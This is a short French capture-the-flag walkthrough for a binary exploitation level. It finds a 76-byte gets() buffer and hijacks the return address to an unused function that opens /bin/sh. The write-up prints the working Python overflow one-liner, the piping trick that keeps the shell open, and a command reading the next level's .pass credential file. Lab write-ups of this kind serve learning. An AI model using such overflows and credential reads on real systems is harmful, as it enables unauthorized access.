Comment trouver le flag1

On a encore un programme quand on le disassemble on voit que y'a une fonction gets et que le programme s'arrete

info function

On voit que le main a une function gets appelée on peut ecrire dans ce buffer (potentiel overflow)
on voit que la function RUN n'est pas execute dans le main


donc on va essayer d'overflow le gets grace a un buffer overflow generator https://wiremask.eu/tools/buffer-overflow-pattern-generator/
l'overflow a lieu a partir de 76 (quand on decompile l'executable, sur ghidra on voit le buffer[76] qui est donne a gets)

on va donc faire une commande python

<!-- python -c "print 76 * 'a' + '\x08\x04\x84\x44'[::-1]" > /tmp/overflow

on va ouvrir un STDIN avec un cat et faire executer notre overflow 

cat /tmp/overflow - | ./level1 -->

(python -c "print 'A' * 76 + '\x08\x04\x84\x44'[::-1]"; cat) | ./level1

On va jusqu'a l'overflow du buffer, puis on envoi la chaine d'octets en little-endian du lancement de la fonction "run" qui lance un /bin/sh
On cat en second temps pour avoir acces au sous shell avant de segfault, et tout ca est envoye dans ./level1

whoami dans le stdin -> L'overflow a marcher puisqu'on voit qu'on est le level2

cat /home/user/level2/.pass , et on a notre flag